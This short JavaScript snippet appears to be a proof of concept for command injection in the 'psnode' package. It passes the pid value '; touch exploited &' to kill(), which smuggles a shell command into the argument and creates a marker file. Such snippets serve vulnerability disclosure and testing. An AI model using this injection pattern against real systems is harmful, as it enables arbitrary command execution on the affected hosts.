
const pkg = require('psnode');

const pid = "; touch exploited &";

pkg.kill(pid)